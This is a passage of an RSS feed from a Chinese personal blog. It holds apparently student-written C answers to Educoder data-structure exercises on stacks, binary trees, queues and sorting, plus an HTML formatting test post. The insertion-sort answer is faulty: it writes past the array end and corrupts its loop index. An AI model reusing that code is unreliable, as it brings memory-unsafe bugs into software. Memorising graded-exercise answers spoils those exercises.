class="line">S.elem[S.top] = e;    </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SS_Pop</span><span class="params">(SqStack &amp;S, ElemType &amp;e)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span>(SS_IsEmpty(S)) <span class="keyword">return</span>; </span><br><span class="line">e = S.elem[S.top]; </span><br><span class="line">S.top--;   </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Conversion</span><span class="params">(<span class="keyword">int</span> N, <span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">/********** Begin *********/</span></span><br><span class="line">SqStack S; </span><br><span class="line">  ElemType p;</span><br><span class="line">  SS_Initiate(S);</span><br><span class="line">  <span class="keyword">while</span>(N) </span><br><span class="line">  {</span><br><span class="line">  SS_Push(S,N%r); </span><br><span class="line">  N = N/r;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">while</span>(!SS_IsEmpty(S))</span><br><span class="line">{</span><br><span class="line">  SS_Pop(S,p);</span><br><span class="line">  <span class="keyword">if</span>(r!=<span class="number">16</span>)</span><br><span class="line">  {</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%d"</span>,p);</span><br><span class="line">}</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%X"</span>,p);</span><br><span class="line">} </span><br><span class="line">}</span><br><span class="line">    <span class="comment">/********** End **********/</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="3-4-树和二叉树及其应用"><a href="#3-4-树和二叉树及其应用" class="headerlink" title="3-4  树和二叉树及其应用"></a>3-4  树和二叉树及其应用</h3><h4 id="3-4-1-二叉树的创建"><a href="#3-4-1-二叉树的创建" class="headerlink" title="3-4-1  二叉树的创建"></a>3-4-1  二叉树的创建</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"binary_tree.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BiTree <span class="title">CreateBiTree</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">/********** Begin *********/</span></span><br><span class="line">BiTNode *p;</span><br><span class="line">    <span class="keyword">char</span> data;</span><br><span class="line">   <span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;data);</span><br><span class="line">   <span class="keyword">if</span>(data==<span class="string">'#'</span>)</span><br><span class="line">    {</span><br><span class="line">      p = <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      p = (BiTNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BiTNode));</span><br><span class="line">      p-&gt;data = data;</span><br><span class="line">      p-&gt;lchild = CreateBiTree();</span><br><span class="line">      p-&gt;rchild = CreateBiTree();</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">   </span><br><span class="line">    <span class="comment">/********** End **********/</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InOrder</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">/********** Begin *********/</span></span><br><span class="line"><span class="keyword">if</span>(T!=<span class="literal">NULL</span>)</span><br><span class="line">   {</span><br><span class="line">        InOrder(T-&gt;lchild);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>,T-&gt;data);</span><br><span class="line">        InOrder(T-&gt;rchild);</span><br><span class="line">} </span><br><span class="line">    <span class="comment">/********** End **********/</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="3-4-2-计算二叉树的深度和结点的个数"><a href="#3-4-2-计算二叉树的深度和结点的个数" class="headerlink" title="3-4-2  计算二叉树的深度和结点的个数"></a>3-4-2  计算二叉树的深度和结点的个数</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"binary_tree.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetTreeDepth</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">/********** Begin *********/</span></span><br><span class="line">    <span class="keyword">int</span> l=<span class="number">0</span>,r=<span class="number">0</span>,h=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(T==<span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    l=GetTreeDepth(T-&gt;lchild);</span><br><span class="line">    r=GetTreeDepth(T-&gt;rchild);</span><br><span class="line">    <span class="keyword">if</span>(l&gt;r)</span><br><span class="line">        h=l+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        h=r+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> h;</span><br><span class="line">    <span class="comment">/********** End **********/</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetNodeNumber</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="comment">/********** Begin *********/</span></span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">     <span class="keyword">return</span> GetNodeNumber(T-&gt;lchild)+GetNodeNumber(T-&gt;rchild)+<span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">/********** End **********/</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetLeafNodeNumber</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">/********** Begin *********/</span></span><br><span class="line">    <span class="keyword">int</span> l_sum=<span class="number">0</span>,r_sum=<span class="number">0</span>,sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(T-&gt;lchild==<span class="literal">NULL</span>&amp;&amp;T-&gt;rchild==<span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        l_sum=GetLeafNodeNumber(T-&gt;lchild);</span><br><span class="line">    r_sum=GetLeafNodeNumber(T-&gt;rchild);</span><br><span class="line">}</span><br><span class="line">sum=l_sum+r_sum;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">    <span class="comment">/********** End **********/</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="3-4-3-实现二叉树左右子树交换"><a href="#3-4-3-实现二叉树左右子树交换" class="headerlink" title="3-4-3  实现二叉树左右子树交换"></a>3-4-3  实现二叉树左右子树交换</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"binary_tree.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BiTree <span class="title">BiTreeChange</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">/********** Begin *********/</span></span><br><span class="line">    BiTNode *p;</span><br><span class="line">    <span class="keyword">if</span>(T==<span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span> T;</span><br><span class="line">}</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">    p = T-&gt;lchild;</span><br><span class="line">T-&gt;lchild = T-&gt;rchild;</span><br><span class="line">T-&gt;rchild = p;</span><br><span class="line">        BiTreeChange(T-&gt;lchild);</span><br><span class="line">BiTreeChange(T-&gt;rchild);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> T;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/********** End **********/</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PreOrder</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">/********** Begin *********/</span></span><br><span class="line">    <span class="keyword">if</span>(T != <span class="literal">NULL</span>)</span><br><span class="line">   {</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"%c"</span>,T-&gt;data);</span><br><span class="line">   PreOrder(T-&gt;lchild);</span><br><span class="line">    PreOrder(T-&gt;rchild);</span><br><span class="line">    } </span><br><span class="line">    <span class="comment">/********** End **********/</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="3-4-4-层次遍历二叉树"><a href="#3-4-4-层次遍历二叉树" class="headerlink" title="3-4-4  层次遍历二叉树"></a>3-4-4  层次遍历二叉树</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"binary_tree.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SQ_Initiate</span><span class="params">(SqQueue *Q)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">Q-&gt;elem = (QElemType*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(QElemType)*MAXSIZE);</span><br><span class="line">Q-&gt;front=Q-&gt;rear=<span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">SQ_IsEmpty</span><span class="params">(SqQueue Q)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">return</span> Q.front==Q.rear;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">SQ_IsFull</span><span class="params">(SqQueue Q)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">return</span> (Q.rear+<span class="number">1</span>)%MAXSIZE==Q.front;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SQ_In</span><span class="params">(SqQueue *Q, QElemType e)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">   <span class="keyword">if</span>(SQ_IsFull(*Q)) <span class="keyword">return</span>;</span><br><span class="line">Q-&gt;elem[Q-&gt;rear]=e;Q-&gt;rear=(Q-&gt;rear+<span class="number">1</span>)%MAXSIZE;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SQ_Out</span><span class="params">(SqQueue *Q, QElemType *e)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span>(SQ_IsEmpty(*Q)) <span class="keyword">return</span>; </span><br><span class="line">*e=Q-&gt;elem[Q-&gt;front];Q-&gt;front=(Q-&gt;front+<span class="number">1</span>)%MAXSIZE;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function">BiTree <span class="title">CreateBiTree</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">   BiTree T;<span class="keyword">char</span> ch;</span><br><span class="line">ch=getchar();</span><br><span class="line"><span class="keyword">if</span>(ch==<span class="string">'#'</span>) T=<span class="literal">NULL</span>; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">T=(BiTNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BiTNode)); </span><br><span class="line">T-&gt;data=ch;</span><br><span class="line">T-&gt;lchild=CreateBiTree( ); </span><br><span class="line">T-&gt;rchild=CreateBiTree( ); </span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> T;  </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HierarchyOrder</span><span class="params">(BiTree T)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">/********** Begin *********/</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">BiTree p,q[<span class="number">1000</span>];</span><br><span class="line">p = T;</span><br><span class="line"><span class="keyword">if</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line">i = <span class="number">1</span>;</span><br><span class="line">q[i] = p;</span><br><span class="line">j = <span class="number">2</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">while</span>(i!=j)</span><br><span class="line">{</span><br><span class="line">p = q[i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>,p-&gt;data);</span><br><span class="line"><span class="keyword">if</span>(p-&gt;lchild!=<span class="literal">NULL</span>) </span><br><span class="line">{</span><br><span class="line">q[j] = p-&gt;lchild;</span><br><span class="line">j = (j+<span class="number">1</span>)%<span class="number">1000</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(p-&gt;rchild!=<span class="literal">NULL</span>) </span><br><span class="line">{</span><br><span class="line">q[j] = p-&gt;rchild;</span><br><span class="line">j = (j+<span class="number">1</span>)%<span class="number">1000</span>;</span><br><span class="line">}</span><br><span class="line">i = (i+<span class="number">1</span>)%<span class="number">1000</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">/********** End **********/</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="4-4-排序"><a href="#4-4-排序" class="headerlink" title="4-4  排序"></a>4-4  排序</h3><h4 id="4-4-1-实现直接插入排序"><a href="#4-4-1-实现直接插入排序" class="headerlink" title="4-4-1  实现直接插入排序"></a>4-4-1  实现直接插入排序</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"directInsSort.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DirecInsSort</span><span class="params">(<span class="keyword">int</span>* a, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i,k;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;n;i++)   </span><br><span class="line">{</span><br><span class="line">        <span class="comment">/********** Begin *********/</span></span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;a[i<span class="number">-1</span>])</span><br><span class="line">{</span><br><span class="line">a[n+<span class="number">10</span>] = a[i];</span><br><span class="line">a[i] = a[i<span class="number">-1</span>];</span><br><span class="line"><span class="keyword">for</span>(k=i<span class="number">-2</span>;a[n+<span class="number">10</span>]&lt;a[i];i--)</span><br><span class="line">{</span><br><span class="line">a[i+<span class="number">1</span>]=a[i];</span><br><span class="line">}</span><br><span class="line">a[i+<span class="number">1</span>]=a[n+<span class="number">10</span>];</span><br><span class="line">}</span><br><span class="line">        <span class="comment">/********** End **********/</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SortPrint</span><span class="params">(<span class="keyword">int</span>* a, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sort result:"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</span><br><span class="line">}    </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="4-4-2-实现快速排序"><a href="#4-4-2-实现快速排序" class="headerlink" title="4-4-2  实现快速排序"></a>4-4-2  实现快速排序</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"quickSort.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">QSort__</span><span class="params">(<span class="keyword">int</span>* a, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>{   </span><br><span class="line">    <span class="keyword">int</span> l,r;  </span><br><span class="line">    <span class="keyword">if</span>(low&gt;=high) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    Swap(a[low], a[rand()%(high-low+<span class="number">1</span>)+low]); </span><br><span class="line"></span><br><span class="line">    l = low; </span><br><span class="line">r = high; </span><br><span class="line">    <span class="keyword">int</span> temp =a [l];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/********** Begin *********/</span></span><br><span class="line">    <span class="keyword">while</span>(l&lt;r)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">while</span>(l&lt;r&amp;&amp;a[r]&gt;=temp)</span><br><span class="line">{</span><br><span class="line">r--;</span><br><span class="line">}</span><br><span class="line">a[l] = a[r];</span><br><span class="line"><span class="keyword">while</span>(l&lt;r&amp;&amp;a[l]&lt;=temp)</span><br><span class="line">{</span><br><span class="line">l++;</span><br><span class="line">}</span><br><span class="line">a[r] = a[l];</span><br><span class="line">}</span><br><span class="line">    a[l] = temp;</span><br><span class="line">QSort__(a,low,l<span class="number">-1</span>);                 </span><br><span class="line">    QSort__(a,l+<span class="number">1</span>,high);                 </span><br><span class="line">    <span class="comment">/********** End **********/</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">QuickSort</span><span class="params">(<span class="keyword">int</span>* a, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    srand((<span class="keyword">unsigned</span>)time(<span class="number">0</span>)); </span><br><span class="line">    QSort__(a, <span class="number">0</span>, n<span class="number">-1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SortPrint</span><span class="params">(<span class="keyword">int</span>* a, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sort result:"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,a[i]);</span><br><span class="line">} </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content:encoded>
      
      <comments>https://www.los-kos.cn/posts/educoder/#disqus_thread</comments>
    </item>
    
    <item>
      <title>test</title>
      <link>https://www.los-kos.cn/posts/textsss/</link>
      <guid>https://www.los-kos.cn/posts/textsss/</guid>
      <pubDate>Fri, 22 May 2020 04:00:00 GMT</pubDate>
      <description>
      
        Test
      
      </description>
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1><a><center>测试</center></a></h1><h2><a><center>测试</center></a></h2><h3><a><center>测试</center></a></h3><h4><a><center>测试</center></a></h4><h5><a><center>测试</center></a></h5><h6><a><center>测试</center></a></h6><div class="note primary">            <p>初级标签</p></div><div class="note success">    <p> Codeblock in note<br>成功标签</p></div><div class="note info">            <p> Info Header<br>信息标签</p></div><div class="note warning">            <p> Warning Header<br>警告标签</p>          </div><div class="note danger">            <p> Danger Header<br>危险标签</p>          </div><div class="note info no-icon">            <p>note info no-icon<br>无图标标签</p>          </div><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content:encoded>
      
      <comments>https://www.los-kos.cn/posts/textsss/#disqus_thread</comments>
    </item>
    
    <item>
